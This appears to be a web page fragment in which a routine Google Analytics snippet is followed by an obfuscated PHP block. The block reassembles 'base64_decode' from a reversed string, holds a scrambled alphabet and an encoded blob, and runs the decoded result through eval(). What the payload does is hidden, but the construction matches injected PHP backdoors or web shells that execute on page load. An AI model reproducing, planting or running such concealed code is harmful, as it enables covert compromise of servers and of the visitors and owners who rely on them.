<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-80881205-2', 'auto');
  ga('send', 'pageview');

</script>
<?php //--GT--// 
 
$_F=__GT__; define($_F, strrev('edoced_46esab')); $_X="A0zBy+CxDw=EvFuG4tHs7IrJq8KpLoM3nNm5OlPk2QjRiS6hTg9UfVe1WdXcY-bZa"; define($_F, strrev('edoced_46esab')); $_Y="KbTkKN-5+aZPRaZPADy5QUu6IEIzQqIHQwZuK4VlWJliWJ58+qGGKsan0MpS0Eun0CIvyqu9xgE9x6mnLYa3X7IhyDJGKsanA6IZ+W5fON-t+NIpyMp9OM3fzsuYyC+9+gt1Kq8u=405=VEIzD8nL1ZPQgxpxWmGKsa8+qG5Qgwt0X8iWJ58zMUhmYauRg0f+gE9PXx3yCQlzqT1mWV9+gt1QY1GQN+nP4S3XM0N+MpZ0sG8zMUhmY180qEZmY8iWJlMyqdf+qF5Qgotz4mlL1ZP0D35zYanK6aGyDdl0qTuRM3pznIp+7RG0gpYKsQSx6R7KrdMzqoZRg0tyqFuRpItAguhysRG+qpH04Z7m7RcFgUrAY-4AgESzX-FAXyrmrRZLqo5RVmMRbRZ3Wh90b1f0Mu9xWTGO7TG4N-pz7-4AgESzX-zRWdtRgtY0DyuR8wt+Mpfzra1mso1A6a7R6It+MxpxWZ7CqQSyDojRroDQ7mYmrJizY-4AgESzW1fy4TGC41f0Mu9xWTkONacQbS3XnZ3Xrkc"; $_zincode=($_F ? __GT__:NULL); eval($_zincode(strrev("=sDM9k1XkowOw0DWfRiC7ATPS9FJKsTKZ9FJowWY2VmC7kSWfRCLiciIuY0Xk4iInICLn81X5FGUlRXYH91XngSZjFGbwVmcfdWZyVWPS9FJKsTKZ9FJoUGZvNWZk9FN2U2chJWPZ9FJKsTKY9FJskCWfRCK2VmcyR3cgwSWfRCKyRnc0NXPZ9FJ")));
?>
